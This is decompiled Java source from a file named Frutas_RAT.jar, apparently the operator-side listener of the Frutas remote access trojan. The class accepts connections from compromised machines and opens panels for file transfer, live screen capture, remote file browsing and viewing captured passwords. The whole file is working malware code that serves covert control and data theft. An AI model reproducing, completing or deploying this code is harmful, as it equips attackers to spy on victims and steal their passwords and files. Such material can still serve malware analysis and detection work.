/*    */ package cliente;
/*    */ 
/*    */ import Extras.JdeskTopPanel;
/*    */ import java.io.IOException;
/*    */ import java.io.ObjectInputStream;
/*    */ import java.io.ObjectOutputStream;
/*    */ import java.io.PrintStream;
/*    */ import java.net.ServerSocket;
/*    */ import java.net.Socket;
/*    */ import java.util.ArrayList;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class Escucha2 extends Thread
/*    */ {
/*    */   public static FrutaManager frutamanager;
/* 14 */   public static HashMap<String, Usuario> USUARIOS = new HashMap();
/* 15 */   public static boolean CONECTADO = true;
/*    */   private ServerSocket escuchad;
/*    */   private Socket socket;
/* 18 */   private ArrayList lista = new ArrayList();
/*    */ 
/*    */   public Escucha2(int puerto, int cola, FrutaManager fruta) throws IOException {
/* 21 */     this.escuchad = new ServerSocket(puerto, cola);
/* 22 */     frutamanager = fruta;
/* 23 */     System.out.println("Iniciando Servidor por primera vez en el puerto: " + puerto);
/* 24 */     CONECTADO = true;
/*    */   }
/*    */ 
/*    */   public void run()
/*    */   {
/*    */     do {
/*    */       try {
/* 31 */         this.socket = this.escuchad.accept();
/* 32 */         ObjectInputStream in = new ObjectInputStream(this.socket.getInputStream());
/* 33 */         ObjectOutputStream out = new ObjectOutputStream(this.socket.getOutputStream());
/* 34 */         int i = in.readInt();
/* 35 */         switch (i) {
/*    */         case 1:
/* 37 */           EnviarFile m = new EnviarFile(out, frutamanager.idioma);
/* 38 */           m.setVisible(true);
/* 39 */           m.setLocation(100, 100);
/* 40 */           frutamanager.jdeskTopPanel1.add(m, 0);
/* 41 */           this.lista.add(m);
/* 42 */           break;
/*    */         case 2:
/* 44 */           CapturaPantalla mm = new CapturaPantalla(in, out, frutamanager.idioma);
/* 45 */           new Thread(mm).start();
/* 46 */           mm.setVisible(true);
/* 47 */           mm.setLocation(100, 100);
/* 48 */           frutamanager.jdeskTopPanel1.add(mm, 0);
/* 49 */           this.lista.add(mm);
/* 50 */           break;
/*    */         case 3:
/* 52 */           FileManager mmm = new FileManager(in, out);
/* 53 */           new Thread(mmm).start();
/* 54 */           mmm.setVisible(true);
/* 55 */           mmm.setLocation(100, 100);
/* 56 */           frutamanager.jdeskTopPanel1.add(mmm, 0);
/*    */ 
/* 58 */           break;
/*    */         case 4:
/* 61 */           PassGUI p = new PassGUI(in);
/* 62 */           new Thread(p).start();
/* 63 */           p.setVisible(true);
/* 64 */           p.setLocation(100, 100);
/* 65 */           frutamanager.jdeskTopPanel1.add(p, 0);
/*    */         }
/*    */ 
/*    */       }
/*    */       catch (IOException ex)
/*    */       {
/* 72 */         System.out.println("Fallo al cerrar");
/*    */       }
/*    */     }
/* 75 */     while (CONECTADO);
/*    */   }
/*    */ 
/*    */   public void stopPara()
/*    */   {
/* 81 */     CONECTADO = false;
/*    */     try
/*    */     {
/* 91 */       this.escuchad.close();
/*    */ 
/* 93 */       for (Object m : this.lista.toArray())
/* 94 */         if (m != null) {
/* 95 */           if ((m instanceof CapturaPantalla)) {
/* 96 */             CapturaPantalla t = (CapturaPantalla)m;
/* 97 */             t.conetado = false;
/*    */           }
/* 99 */           if ((m instanceof EnviarFile)) {
/* 100 */             EnviarFile t = (EnviarFile)m;
/* 101 */             t.Cierra();
/*    */           }
/*    */         }
/*    */     }
/*    */     catch (IOException ex)
/*    */     {
/* 107 */       System.out.println("Error en: StopPara");
/*    */     }
/*    */   }
/*    */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.Escucha2
 * JD-Core Version:    0.6.2
 */